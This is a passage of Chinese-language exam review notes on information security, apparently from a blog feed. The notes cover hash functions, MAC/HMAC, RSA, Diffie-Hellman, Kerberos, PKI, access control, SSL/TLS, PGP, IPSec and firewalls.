model)</p><ul><li>硬件效率：没有连接，并行执行（效率高）</li><li>预处理：预先准备加密箱的输出</li><li>随机存取</li><li>可证明的安全性：CTR至少与和其他模式一样安全</li><li>简单性：只需要对加密算法执行，不需要解密算法的执行；解密密钥的安排调度不需要执行</li></ul><h2 id="公钥加密和消息认证">公钥加密和消息认证</h2><h3 id="安全Hash函数">安全Hash函数</h3><blockquote><p>Hash函数应满足的性质</p></blockquote><p>一个hash函数H的性质：</p><ul><li>H能应用于任意长度的数据</li><li>H生成固定长度的输出</li><li>对任意的x，H(x)易于计算</li><li>对任意的h，计算x使得H(x)=h是计算上不可行的 （单向性）</li><li>对任意的x，计算y≠x使得H(y)=H(x)是计算上不可 行的（弱抗碰撞性）</li><li>计算任意对(x,y)使得H(x)=H(y)是计算上不可行的 （强抗碰撞性）</li></ul><h3 id="消息认证码-消息鉴别码">消息认证码(消息鉴别码)</h3><p>消息认证码（MAC）是一种使用密钥的认证技术，它利用密钥来生成一个固定长度的短数据块，并将该数据块附加在消息之后，用于保证消息的完整性。</p><h4 id="基于Hash函数构造（HMAC）">基于Hash函数构造（HMAC）</h4><ul><li>HMAC的设计目标：<ol><li>可以直接使用现有的Hash函数</li><li>不针对于某一个Hash函数，可以根据需要更换Hash函数模块</li><li>可保持Hash函数的原有性能，不能过分降低其性能</li><li>对密钥的使用和处理应较简单</li><li>如果已知嵌入的Hash函数的强度，则可以知道认证机制抵抗密码分析的强度</li></ol></li></ul><h4 id="基于分组密码构造">基于分组密码构造</h4><ul><li>使用AES之类的分组密码可以实现消息认证码。</li></ul><h3 id="公钥加密原理">公钥加密原理</h3><blockquote><p>原理：接收者公钥加密</p></blockquote><ul><li>使用两个密钥对于保密性、密钥分发和认证都产生了意义深远的影响</li><li>公钥加密方案由6个部分组成：明文、加密算法、公钥、私钥、密文、解密算法</li></ul><h3 id="公钥加密算法：">公钥加密算法：</h3><h4 id="RSA">RSA</h4><blockquote><p>RSA及其参数设置：基于大整数分解问题（安全性）</p><p>了解具体过程、密钥生成、加密解密、签名</p></blockquote><ol><li><p>密钥的产生</p><ul><li>随机选择两个大的素数$a$和$b$</li><li>计算$n=a\times b$</li><li>计算秘密的欧拉函数$\varphi(n)=(a-1)(b-1)$​</li><li>选择$e$使得$1\lt e\lt\varphi(n)$，且$gcd(e,\varphi(n))=1$</li><li>求$e$的乘法逆元$d$（$ed\equiv 1\bmod\varphi(n),0\le d\le n$​）</li><li>求得公钥$PU={e,N}$</li><li>求得私钥$PR={d,a,b}$​</li></ul></li><li><p>加密过程</p><p>加密时明文以分组为单位进行加密，每个分组m的二进制值均小于n，对明文分组m做加密运算：$c=m^e \bmod n,0\le m\le n$</p></li><li><p>密文解密：$m=c^d\bmod n$</p></li><li><p>计算签名：$s=m^d\bmod n$</p></li><li><p>签名验证：$m=s^e\bmod n$</p></li></ol><h4 id="ElGamal">ElGamal</h4><blockquote><p>ElGamal：基于离散对数问题（具体过程不要求）</p></blockquote><p>ElGamal既能用于数据加密，也能用于数字签名，其安全性是依赖于计算有限域上离散对数这一难题。</p><h3 id="Diffie-Hellman密钥交换">Diffie-Hellman密钥交换</h3><blockquote><p>了解具体过程</p></blockquote><p>Diffie-Hellman算法的唯一目的是使得两个用户能够安全地交换密钥，得到一个共享的会话密钥，算法本身不能用于加密和解密。该算法的安全性基于求离散对数的困难性。</p><ol><li><p>任取一大素数$q$和任一其<a href="https://www.iuoyt.com/posts/215ef6b6.html#%E6%9C%AC%E5%8E%9F%E6%A0%B9%EF%BC%88%E5%AE%9A%E4%B9%89%EF%BC%89">本原根</a>$a(a\lt q)$</p></li><li><p>用户A选择私钥$X_A(\lt q)$，计算公钥$Y_A=a^{X_A}\bmod q$</p><p>用户B选择私钥$X_B(&lt;q)$，计算公钥$Y_B=a^{X_B}\bmod q$</p></li><li><p>用户A加密密钥$K=(Y_B)^{X_A}\bmod q$</p></li><li><p>用户B的加密密钥$K=(Y_A)^{X_B}\bmod q$</p></li></ol><h3 id="数字签名">数字签名</h3><p>方法：发送者使用私钥签名，验证者用公钥进行验证</p><ol><li>传统签名的基本特点<ul><li>能与被签的文件在物理上不可分割</li><li>签名者不能否认自己的签名</li><li>签名不能被伪造</li><li>容易被验证</li></ul></li><li>数字签名是传统签名的数字化,基本要求<ul><li>能与所签文件“绑定”</li><li>签名者不能否认自己的签名</li><li>签名不能被伪造</li><li>容易被验证</li></ul></li></ol><h2 id="密钥分配和用户认证">密钥分配和用户认证</h2><h3 id="两种分类体制">两种分类体制</h3><ol><li>对称体制（需要保证机密性）<ul><li>优点：速度快，适合做大量数据加密</li><li>缺点：功能有限，只有知道密钥的人才可以验证签名（不满足需求）</li></ul></li><li>公钥体制（公钥可以直接公开，需要保证公钥真实性）<ul><li>优点：功能丰富，可以做加密、签名、密钥交换</li><li>缺点：运算速度慢</li></ul></li></ol><h3 id="对称加密的密钥分配">对称加密的密钥分配</h3><p>在两个用户（主机、进程、应用程序）A和B之间分配密钥的方法有以下几种：</p><ol><li>密钥由A选取，并通过物理手段交给B</li><li>密钥由第三方选取，并由第三方通过物理手段交给A和B</li><li>如果A和B事先已有一密钥，则其中一方选取新密钥后，用已有的密钥加密新密钥并发送给另一方</li><li>如果A和B与可信的第三方C分别有一保密通道，则C为A和B选取密钥后，分别在两个保密信道上发送给A和B</li></ol><h3 id="Kerberos">Kerberos</h3><p>应用层安全协议，需要做配置修改，Kerberos需求：安全性、可靠性、透明性、可伸缩性</p><h4 id="会话过程">会话过程</h4><blockquote><p>6个阶段</p></blockquote><img src="https://oss.iuoyt.com/img/posts/image-20240619152737793.png" alt="image-20240619152737793" style="zoom:50%;" /><ol><li>用户以明文方式向认证服务器AS发出请求，要求获得访问TGS的许可证</li><li>AS以证书作为响应，证书包括访问TGS的许可证和用户与TGS之间的会话密钥，会话密钥以用户的密钥加密后传输</li><li>用户解密得到TGS的响应，然后利用TGS的许可证向TGS申请应用服务器的许可证，该申请包括TGS的许可证和一个带有时间戳的认证符。认证符以用户与TGS间的会话密钥加密。</li><li>TGS从许可证中取出会话密钥、解密认证符，验证认证符中时间戳的有效性，从而确定用户的请求是否合法。TGS确认用户的合法性后，生成所要求的应用服务器的许可证，许可证中含有新产生的用户与应用服务器之间的会话密钥。TGS将应用服务器的许可证和会话密钥传回到用户。</li><li>用户向应用服务器提交应用服务器的许可证和用户新产生的带时间戳的认证符（认证符以用户与应用服务器之间的会话密钥加密）。</li><li>应用服务器从许可证中取出会话密钥、解密认证符，取出时间戳并检验有效性。然后向用户返回一个带时间戳的认证符，该认证符以用户与应用服务器之间的会话密钥进行加密。据此，用户可以验证应用服务器的合法性。</li></ol><h4 id="基于口令">基于口令</h4><p>Kerberos是基于口令的认证协议。</p><h4 id="单点登录">单点登录</h4><p>Kerberos协议的设计使得用户只需在初次认证时输入身份验证信息，之后就可以凭借票据访问多个服务，实现了单点登录的便利性。</p><h4 id="防止重放攻击">防止重放攻击</h4><p>在采用Kerberos系统进行认证时，为了防止重放攻击，可以在报文中加入一个时间戳或随机数。</p><p>时间戳可以确保报文的新鲜性，即只有在规定时间内发送的报文才会被接收并处理。如果攻击者尝试重放旧的报文，由于时间戳已经过期，服务器会拒绝该报文。</p><p>随机数(Nonce)也是一种常用的防止重放攻击的手段。在Kerberos协议中，服务器会为每个会话生成一个唯一的随机数，并将其发送给客户端。客户端在发送后续报文时，必须包含这个随机数。如果攻击者尝试重放报文，由于随机数已经使用过，服务器会检测到并拒绝该报文。</p><h4 id="票据（Ticket）和认证符（Authenticator）">票据（Ticket）和认证符（Authenticator）</h4><blockquote><p>票据：降低用户输入口令次数，如果泄露存在重放攻击</p><p>认证符：防止重放攻击</p></blockquote><ul><li>票据（Ticket）：是一个记录凭证，客户可以用它来向服务器证明自己的身份，其中包括客户的标识、会话密钥、时间戳以及其他一些信息。Ticket中的大多数信息都被加密，密钥为服务器的密钥。</li><li>认证符（Authenticator）：是另一个记录凭证，其中包含一些最近产生的信息，产生这些信息需要用到客户机和服务器之间共享的会话密钥。</li></ul><h3 id="非对称加密的密钥分配">非对称加密的密钥分配</h3><h4 id="X-509公钥证书">X.509公钥证书</h4><blockquote><p>为签名和身份做背书</p></blockquote><p>X.509证书由用户公共密钥和用户标识符组成。此外还包括版本号、证书序列号、CA标识符、签名算法标识、签发者名称、证书有效期等信息。有如下作用：</p><ol><li>身份验证</li><li>安全通信</li><li>数字签名</li><li>访问控制</li><li>代码签名</li><li>电子邮件加密和签名</li><li>身份验证和授权</li></ol><h4 id="公钥基础设施PKI">公钥基础设施PKI</h4><blockquote><p>保证公钥真实性</p></blockquote><ul><li><p>PKI是利用公钥密码技术来实现并提供信息安全服务的基础设施，它能够为所有网络应用透明的提高加密、数字签名等密码服务所需要的密钥和证书管理。</p><img src="https://oss.iuoyt.com/img/posts/image-20240619160422134.png" alt="PKI系统组成" style="zoom:50%;" /></li><li><p>证书机构CA是PKI的信任基础，它管理公钥的整个生命周期，其作用包括：发放证 书、规定证书的有效期和通过发布证书撤销列表来确保在必要时可以撤销证书。</p></li><li><p>注册机构RA提供用户和CA之间的一个接口，它用于获取并认证用户的身份，向CA提出证书请求。</p></li></ul><h3 id="身份认证">身份认证</h3><blockquote><p>What you know/have/are</p><p>通过所知道的、所有的、身份特征</p></blockquote><p>分类方式：</p><ul><li>是否使用硬件：软件认证、硬件认证</li><li>需要验证的条件：单因子认证、双因子认证</li><li>认证信息：静态认证、动态认证</li><li>认证手段：<ul><li>基于用户所知道的（秘密如：密码、个人识别码PIN、密钥……）</li><li>基于用户所拥有的（令牌如：信用卡、智能卡、印章……）</li><li>基于用户本身的（生物特征如：语音、笔迹、指纹……）</li></ul></li></ul><h3 id="访问控制">访问控制</h3><p>访问控制是为了限制访问主体（或称为发起者，是一不主动的实体；如用户、进程和服务等），对访问客体（需要保护的资源）的访问权限，从而使计算机系统在合法范围内使用； 访问控制机制决定用户及代表一定用户利益的程序能做什么，及做到什么程度。</p><h4 id="自主访问控制DAC">自主访问控制DAC</h4><p>自主访问控制是指对某个客体具有拥有权（或控制权）的主体能够将对该客体的一种访问权或多种访问权自主地授予其他主体，并在随后的任何时刻将这些权限回收。这种控制是自主的，也就是指具有授予某种访问权力的主体（用户）能够自己决定是否将访问控制权限的某个子集授予其他的主体或从其他主体那里收回他所授予的访问权限。</p><h4 id="强制访问控制MAC">强制访问控制MAC</h4><blockquote><p>⭐️向下读，向上写</p></blockquote><p>所谓强制访问控制是指计算机系统根据使用系统 的机构事先确定的安全策略，对用户的访问权限进行强制性的控制。</p><img src="https://oss.iuoyt.com/img/posts/image-20240619162107012.png" alt="强制访问控制" style="zoom:50%;" /><p>强制访问控制用来保护系统确定的对象，对此对象用户不能进行更改。也就是说，系统独立于用户行为强制执行访问控制，用户不能改变他们的安全级别或对象的安全属性。这样的访问控制规则通常对数据和用户按照安全等级划分标签，访问控制机制通过比较安全标签来确定授予还是拒绝用户对资源的访问。强制访问控制进行了很强的等级划分，所以经常用于军事用途。</p><h3 id="基于角色的访问控制">基于角色的访问控制</h3><p>基于角色的访问控制的基本思想是在用户和访问权限之间引入角色的概念，将用户和角色联系起来，通过对角色的授权来控制用户对系统资源的访问。这种方法可根据用户的工作职责设置若干角色，不同的用户可以具有相同的角色，在系统中享有相同的权力，同一个用户又可以同时具有多个不同的角色，在系统中行使多个角色的权力。</p><h2 id="传输层安全">传输层安全</h2><h3 id="SSL体系结构">SSL体系结构</h3><p><img src="https://oss.iuoyt.com/img/posts/image-20240619162434889.png" alt="SSL的体系结构"></p><h4 id="SSL记录协议">SSL记录协议</h4><blockquote><p>加密、MAC（数据完整性认证）、运行流程</p><p>在传输层，基于TCP，需要按序接收，不能UDP</p></blockquote><p>工作流程（发送方）：</p><ol><li>从上层接受传输的应用报文</li><li>分片：将数据分片成可管理的块，每个上层报文被分成16KB或更小的数据块。</li><li>进行数据压缩（可选）：压缩是可选的，压缩的前提是不能丢失信息，并且增加的内容长度不能超过1024B，默认的压缩算法为空。</li><li>增加MAC：加入信息认证码（MAC），这一步需要用到共享的密钥。</li><li>加密：利用IDEA、DES、3DES或其他加密算法对压缩报文和MAC码进行数据加密。</li><li>增加SSL记录首部：增加由内容类型、主要版本、次要版本和压缩长度组成的首部。</li><li>将结果传输到下层</li></ol><p>接收方：</p><ol><li>从低层接受报文</li><li>解密</li><li>用事先商定的MAC码校验数据</li><li>如果是压缩的数据，则解压缩</li><li>装配数据</li><li>将信息传输到上层</li></ol><h4 id="变更密码规格协议">变更密码规格协议</h4><p>SSL修改密文规约协议用来发送修改密文规约协议信息。任何时候客户都能请求修改密码参数，比如握手密钥交换。在修改密文规约的通告发出以后，客户方就发出一个握手密钥交换信息（如果可得到的话），鉴定认证信息，服务器则在处理了密钥交换信息之后发送 一个修改密文规约信息。此后，新的双方约定的密钥就将一直使用到下次提出修改密钥规约请求为止。</p><h4 id="报警协议">报警协议</h4><p>SSL告警协议是用来将SSL有关的告警传送给对方实体的。和其他使用SSL的情况 一样，告警报文按照当前状态说明被压缩和加密。SSL告警协议的每个报文由两个字节组成。第1个字节的值用来表明告警的级别，第2个字节表示特定告警的代码。如果在通信过程中某一方发现任何异常，就需要给对方发送一条警示消息通告。</p><h4 id="握手协议">握手协议</h4><blockquote><p>防范重放攻击？随机数</p></blockquote><img src="https://oss.iuoyt.com/img/posts/image-20240620144648972.png" alt="SSL握手过程" style="zoom:50%;" /><ol><li><p>客户发出一个带有客户HELLO信息的连接请求。包括如下信息：</p><ul><li>想要使用的SSL版本号</li><li>时间信息，以标准的UNIX 32位格式标识的当前时间和日期</li><li>会话标识（可选），如果没有指定的话，则服务器重用上一次的会话标识或返回一个错误信息</li><li>密文组（客户方所支持的各种加密算法选项清单，包括认证码、密钥交换方法、加密和MAC算法）</li><li>客户方所支持的压缩算法</li><li>随机数</li></ul></li><li><p>服务器评估客户方发来的HELLO信息中的各项参数，并且返回一个服务器方的HELLO信息，其中包含SSL会话的各项参数，具体内容如下：</p><ul><li>版本号</li><li>时间信息，以标准的UNIX 32位格式标识的当前时间和日期</li><li>会话标识</li><li>密文组</li><li>压缩方法</li><li>随机数</li></ul><p>在服务器HELLO消息发送之后，服务器发出如下信息：</p><ul><li>服务器证书，如果服务器需要被鉴别的话。</li><li>服务器密钥交换信息，如果得不到证书或证书仅仅用作签名的话。</li><li>证书请求，如果客户要求被鉴别的话。</li></ul><p>最后，服务器发出一个服务器HELLO DONE信息，开始等待客户的回音。</p></li><li><p>客户发送下列信息：</p><ul><li>如果服务器发出了一个证书请求，那么客户方必须发送一个证书或非证书信息。</li><li>如果服务器发送了一个服务器密钥交换信息，那么客户方就发送一个基于公钥算法的由HELLO信息决定的密钥交换信息。</li><li>如果客户方已经发送了一个证书，那么客户方就需验证服务器方的证书并且发出一个证书验证信息指明结果。</li></ul><p>然后，客户方发出一个结束信息，指出协商过程已经完成。客户方还将发送一个修改密文规约信息来产生共享的常规密钥。应该注意这部分工作不是由握手协议控制，而是由修改密文规约协议管理的。</p></li><li><p>服务器发出一个结束信息，指出协商阶段完成。然后服务器发出一个修改密文规约信息。</p></li><li><p>会话双方分别产生一个加密密钥，然后他们再根据这些密钥导出会话主密钥。握手协议改变状态至连接状态。所有从应用层来的数据传输作为特定信息传输给对方。</p></li></ol><h5 id="暂态Diffie-Hellman">暂态Diffie-Hellman</h5><p>暂态Diffie-Hellman使用临时的公钥。每个协议的实例或运行使用不同的公钥。服务器临时公钥的真实性可以通过检查公钥上的签名来验证。由于公钥是临时的，即使服务器的长期签名密钥被泄露，也不会危及过去会话的隐私。这被称为完美前向保密性（PFS）。</p><h5 id="RSA密钥交换：由客户端选择会话密钥">RSA密钥交换：由客户端选择会话密钥</h5><p>客户端在发起与服务器的连接时，会生成一个对称加密的会话密钥（通常是一个随机数），这个会话密钥用于加密整个会话过程中的数据传输。客户端使用服务器的公钥对会话密钥进行加密，这样，只有服务器的私钥能够解密这个会话密钥，这样可以确保在整个通信过程中，只有服务器和客户端共享相同的会话密钥，其他任何人（包括中间人攻击者）都无法获取会话密钥或解密通信内容。</p><h4 id="SSL如何防范Web安全威胁">SSL如何防范Web安全威胁</h4><blockquote><p>如穷举密码分析攻击、已知明文字典攻击、重放攻击、中间人攻击、口令窃听、IP地址假冒、IP劫持，但无法防范SYN泛滥</p></blockquote><ol><li>穷举密码分析攻击：使用加密算法（如AES）</li><li>已知明文字典攻击：验证对端身份</li><li>重放攻击：使用时间戳和随机数来保护通信的唯一性</li><li>中间人攻击：使用公钥基础设施（PKI）和数字证书来验证通信两端的身份</li><li>口令窃听：使用加密技术（如对称加密和非对称加密）来加密传输的数据</li><li>IP地址假冒和IP劫持：通过加密通信和数字证书验证，SSL可以确保通信的两端确实是预期的合法实体，而不是恶意的IP地址假冒或劫持者</li><li>SYN泛滥：SSL/TLS本身不直接处理TCP层面的SYN泛滥攻击</li></ol><h3 id="HTTPS-HTTP-SSL">HTTPS=HTTP+SSL</h3><p>SSL握手协议用于鉴别初始化和传输密钥，它使得服务器和客户能相互鉴别对方的身份，并保护在SSL记录中发送的数据。因此在传输任何应用数据前，都必须使用握手协议。 一个SSL会话是按以下步骤初始化的：</p><ol><li>客户方，用户用URL发出的请求中，HTTP用HTTPS替代</li><li>客户方的SSL请求通过TCP的443端口与服务器方的SSL进程建立连接</li><li>然后客户方初始化SSL握手状态，用SSL记录协议作为载体。这时，客户/服务器双方的连接中还没有加密和完整性检查的信息。</li></ol><h3 id="SSH协议">SSH协议</h3><p>SSH是一种远程登录安全协议，它提供了一条安全的远程登录通道。</p><h2 id="PGP与电子邮件安全（7-5）">PGP与电子邮件安全（7.5）</h2><h3 id="PGP提供的安全服务">PGP提供的安全服务</h3><h4 id="压缩顺序（签名—压缩—加密）">压缩顺序（签名—压缩—加密）</h4><ul><li>压缩对邮件传输或存储都有节省空间的好处</li><li>签名后压缩的原因：<ul><li>不需要为检验签名而保留压缩版本的消息</li><li>为了检验而再做压缩不能保证一致性，压缩算法的 不同实现版本可能会产生不同的结果</li></ul></li><li>压缩之后再做加密的原因：</li><li>压缩后的消息冗余小，增加密码分析的难度</li><li>若先加密，则压缩难以见效</li></ul><h4 id="4种类型的密钥">4种类型的密钥</h4><ol><li>一次性会话传统密钥</li><li>公钥</li><li>私钥</li><li>基于口令短语的传统密钥</li></ol><h3 id="PGP的信任模型：Web-of-Trust">PGP的信任模型：Web-of-Trust</h3><h4 id="X-509与PGP对用户公钥的信任模型有何不同？">X.509与PGP对用户公钥的信任模型有何不同？</h4><p>X.509采用层次CA的结构，PGP采用Web-of-Trust建立信任。X.509用户只信任CA，而PGP用户可以相信其他用户。</p><h4 id="Owner-trust-field、Key-legitimacy-field">Owner trust field、Key legitimacy field</h4><ul><li>Owner trust field：表明该公钥用于签名其它公钥证书时的信任程度。这个信任程度是由用户给出的。</li><li>Key legitimacy field：合法性或者有效性，表明PGP对“此用户公钥是合法的”的信任程度；信任级别越高，这个userID与该公钥的绑定越强。这个字段是由PGP计算的</li></ul><h2 id="IPSec">IPSec</h2><h3 id="IPSec的好处">IPSec的好处</h3><ul><li>对通过其边界的所有通信流提供了强安全性</li><li>对所有应用透明：位于传输层（TCP，UDP） 之下</li><li>当防火墙或路由器使用IPSec时，没有必要对 用户系统和服务器系统的软件做任何改变</li><li>IPSec对终端用户透明，不需要对用户进行安 全机制的培训</li><li>IPSec能给个人用户提供安全性</li></ul><h3 id="数据结构：安全关联（SA）">数据结构：安全关联（SA）</h3><ul><li>安全关联（SA）是发送者和接收者两个IPSec系统之间的一个简单的单向逻辑连接，是与给定的一个网络连接或一组网络连接相关联的安全信息参数集合。因为SA是单个方向的，所以，对于一个双向通信，则需要两个SA。</li><li>一个安全关联由三个参数唯一确定：<ul><li>Security Parameter Index (SPI)：赋给此SA的一个仅在本地有意义的比特串</li><li>IP Destination address：SA的目的端点地址</li><li>Security Protocol Identifier: AH or ESP：标示SA使用的IPSec协议</li></ul></li></ul><h3 id="两个协议">两个协议</h3><h4 id="AH（7-4-2）">AH（7.4.2）</h4><ul><li><p>AH协议为中通信提供数据源认证、数据完整性和反重播保证，它能保护通信免受篡改，但不能防止窃听，适合用于传输非机密数据。</p><img src="https://oss.iuoyt.com/img/posts/image-20240620115150837.png" alt="AH报头格式" style="zoom:50%;" /></li><li><p>AH的工作原理是在每一个数据包上添加 一个身份验证报头。此报头包含一个带密钥的Hash散列（可以将其当作数字签名，只是它不使用证书），此Hash散列在整个数据包中计算，因此对数据的任何更改将致使散列无效——这样就提供了完整性保护。</p></li></ul><h4 id="ESP（7-4-3）">ESP（7.4.3）</h4><ul><li><p>ESP为IP数据包提供完整性检查、认证和加密。可以将其看作“超级AH”，因为它提供机密性并可防止篡改。ESP服务依据建立的安全关联（SA）是可选的。然而，也有如下一 些限制：</p><ul><li>完整性检查和认证一起进行</li><li>仅当与完整性检查和认证一起时，“重播（Replay）”保护才是可选的</li><li>“重播”保护只能由接收方选择</li></ul><img src="https://oss.iuoyt.com/img/posts/image-20240620115416616.png" alt="ESP的格式" style="zoom:50%;" /></li></ul><h4 id="IPSec报头格式（P196）">IPSec报头格式（P196）</h4><blockquote><p>携带安全参数索引SPI（指定SA）、序列号（抗重放）</p></blockquote><ul><li>每个SA用唯一的SPI索引标识，当处理接收数据包时，服务器根据SPI值来决定该使用哪种SA。具体采用什么方式，要由三方面的因素决定：第一个是安全参数索引（SPI），该索引存 在于IPSec协议头内；第二个是IPSec协议值；第三个是要向其应用SA的目标地址。</li><li>序列号是一个无符号单调递增的计数器，从1开始的32位单增序列号，不允许重复，唯一地标识了每一个发送数据包，为安全关联提供反重播保护。接收端将校验序列号为该字段值的数据包是否已经被接收过， 若是，则拒收该数据包。对于一个特定的SA，它用于实现反重传服务。</li></ul><h4 id="AH的认证范围更广，包括IP头">AH的认证范围更广，包括IP头</h4><p>AH协议的认证范围更广泛，包括IP数据报的头部部分。在IPSec中，AH协议提供数据完整性验证和防篡改保护，其作用范围涵盖整个IP数据报，包括其头部信息，这使得AH协议在保护IP数据报完整性方面有更广泛的应用。</p><h3 id="密钥管理IKE">密钥管理IKE</h3><h4 id="中间人攻击：认证">中间人攻击：认证</h4><ul><li><p>中间人攻击是一种间接的攻击方法，假设A和B是需要通信的双方，C则是“中间人”。A和B都以为将消息传送给对方，没有意识到由一个中间人C在转发消息。C不仅可以窃听A和B的通信，还可以对信息进行篡改再传给对方。当然C也可以获得A和B之间通信的敏感信息。<br><img src="https://oss.iuoyt.com/img/posts/image-20240620134747536.png" alt="中间人攻击" style="zoom:33%;" /></p></li><li><p>攻击过程：</p><ol><li>$A\to C$：A的公钥$PU_A$和身份标识$ID_A$</li><li>$C\to B$：C的公钥$PU_C$和身份标识$ID_C$</li><li>$B\to C$：$E_{PU_C}(K_S)$，C因此知道$K_S$</li><li>$C\to A$：$E_{PU_A}(K_S)$</li></ol></li><li><p>改进方式：认证。假设A和B事先可以得到对方的公钥，会话钥分配过程如下：</p><ol><li><p>$A\to B$：$E_{PU_B}(ID_A || N_1)$</p><p>A用B的公钥加密自己的身份$ID_A$和临时交互号$N_1$，然后将消息传送给B，只有B能够打开这个消息</p></li><li><p>$B\to A$：$E_{PU_A}(N_1||N_2)$​</p><p>B用A的公钥加密临时交互号$N_1$和$N_2$，然后将消息传给A，只有A能够打开该消息，通过$N_1$的正确性确认对方身份</p></li><li><p>$A\to B$：$E_{PU_B}(N_2+1)$​</p><p>A用B的公钥加密$N_2+1$，然后将消息传给B，B也可以通过$N_2$认证对方的身份</p></li><li><p>$B\to A$：$E_{PU_A}(E_{PR_B}(K_S))$​</p><p>由B产生一个会话钥，先用私钥$PR_B$加密，再用A的公钥加密，做到既保密又认证</p></li></ol></li></ul><h4 id="拥塞攻击：Cookie交换">拥塞攻击：Cookie交换</h4><ul><li>Cookie交换要求每一方在初始消息中发送一个伪随机数，即cookie，而另一方对此做出相应的应答。</li><li>Cookie的要求：<ul><li>Cookie的值必须依赖于特定的参与方，即与参与方的某种标识关联</li><li>除了产生Cookie的这一方之外，其他人都无法产生出可被他接受的Cookie值，所以，产生和验证Cookie时都会用到本地的秘密信息</li><li>Cookie的产生和验证方法必须足够快速</li></ul></li></ul><h4 id="重放攻击：序列号">重放攻击：序列号</h4><ul><li>重放攻击：攻击者获得经过认证的数据包的一个附本，并在稍后的某个时间发送给目标。接受到重复的，经过认证的数据包可能以某种方式扰乱服务，或者可能产生其他不可预料的后果。</li><li>设计序列号来防范重放攻击：当新的SA建立时，发送者初始化序列号计数器为0，每次SA发送一个数据包，计数器便加1。如果需要抗重放服务，序列号计数器不允许从$2^{32}-1$到0重复循环，如果计数器到达最大值$2^{32}-1$，发送者必须 终止此SA，协商一个新的SA和一个新密钥</li></ul><h3 id="两种工作模式">两种工作模式</h3><h4 id="AH传输模式">AH传输模式</h4><p>传输模式用于两台主机之间，只对上层协议数据（传输层数据）和IP头中的固定字段提供认证，主要保护传输层协议头，实现端到端的安全。</p><img src="https://oss.iuoyt.com/img/posts/image-20240620141101720.png" alt="AH传输模式" style="zoom:50%;" /><p>在传输模式的AH中，封装后的分组IP头仍然是原IP头，只是IP头的协议字段由原来的值变为51，表示IP头后紧接的载荷为AH载荷。</p><h4 id="AH隧道模式">AH隧道模式</h4><p>隧道模式对整个IP数据项提供认证保护，把需要保护的IP包封装在新的IP包中，既可用于主机也可用于安全网关，并且当 AH在安全网关上实现时，必须采用隧道模式。</p><img src="https://oss.iuoyt.com/img/posts/image-20240620141411478.png" alt="AH隧道模式" style="zoom:50%;" /><p>在隧道模式的AH中，不是将原始的IP报头移到最左边然后插入AH报头，而是复制原始IP报头，并将复制的IP报头移到数据报最左边作为新的IP报头。随后在原始IP报头与IP报头的副本之间放置AH报头。原始IP报头保持原封不动，并且整个原始IP报头都被认证或由加密算法进行保护。</p><h4 id="ESP传输模式">ESP传输模式</h4><p>IP报头被调整到数据报左边，并插入ESP报头；ESP报尾以及ICV（完整性校验值，用于认证）被附加在数据报末端。如果需要加密，仅对原始数据和新的ESP报尾进行加密。认证从后ESP报头一直延伸到ESP报尾。</p><img src="https://oss.iuoyt.com/img/posts/image-20240620141655817.png" alt="ESP传输模式" style="zoom:50%;" /><h4 id="ESP隧道模式">ESP隧道模式</h4><p>在ESP隧道模式下，原数据包（包括原IP报头和数据）被封装在ESP报头和ESP报尾之间，外边附上了新的IP报头。在这种模式下，加密部分为原IP数据包和ESP报尾，完整性检查部分为ESP报头、原IP数据包以及ESP报尾。整个原始数据报都可以用这种方法进行加密或认证。如果既选择ESP认证又选择ESP加密， 那么应该首先实现加密。这就允许在传输之前与发送方没有改变数据报的保证一同实现认证,并且接收方在对分组进行解密之前认证数据报。</p><img src="https://oss.iuoyt.com/img/posts/image-20240620141853530.png" alt="ESP隧道模式" style="zoom:50%;" /><h2 id="防火墙">防火墙</h2><h3 id="不同类型防火墙的特点">不同类型防火墙的特点</h3><h4 id="包过滤路由器">包过滤路由器</h4><ol><li>优点:<ul><li>简单</li><li>对用户透明</li><li>高处理速度</li></ul></li><li>缺点:<ul><li>不能阻止利用了特定应用漏洞或功能所进行的攻击。 如，不能阻止特定的应用命令</li><li>日志记录功能有限</li><li>不支持高级的用户认证机制</li><li>对利用TCP/IP规范和协议栈存在的问题进行的攻击没 有很好的应对措施。如，IP地址假冒攻击</li><li>设置包过滤规则比较困难</li></ul></li></ol><h4 id="状态检测防火墙">状态检测防火墙</h4><ul><li>传统的包过滤防火墙不考虑更高层的上下文信息，允许来自基于TCP的所有高端口的入站网络流量</li><li>状态检测防火墙建造了一个出站TCP连接目录，仅当入站数据包符合目录里某个条目时，才允许到达高端口的入站流量通过</li><li>状态检测防火墙在上下文中检查每个IP包</li><li>记录有关TCP连接的信息：TCP序列号轨迹、检查有限的应用层数据</li></ul><h4 id="应用层网关">应用层网关</h4><ol><li>优点<ul><li>比包过滤防火墙更安全</li><li>只需要细查少数可以允许的应用程序</li><li>容易记录和审计所有的入站流量</li></ul></li><li>缺点：带来了对每个连接的额外处理开销（建立两个接合的连接）</li></ol><h3 id="理解简单的包过滤规则">理解简单的包过滤规则</h3><ul><li>包过滤规则是基于网络安全策略（即凡是未被明确许可的就是禁止的或凡是未被明确禁止的就是许可的）的。包过滤规则是在考虑了外部攻击以及服务级别限制和收发双方的通信级别限制等因素后制定的。</li><li>包过滤类型的防火墙要遵循的一条基本原则是“最小特权原则”，即明确允许那些管理员希望通过的数据包，禁止其他数据包</li><li>包过滤可分为静态包过滤和动态包过滤两种。 静态包过滤这种类型的防火墙根据定义好的过滤规则审查每个数据包，以便确定其是否与某一条包过滤规则匹配。动态包过滤采用动态设置包过滤规则的方法，避免了静态包过滤所具有的问题。这种技术后来发展成为所谓包状态监测技术。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学期总结 </tag>
            
            <tag> 信息安全技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大学物理期末复习-分类检测</title>
      <link href="/posts/9caf9e2f.html"/>
      <url>/posts/9caf9e2f.html</url>
      
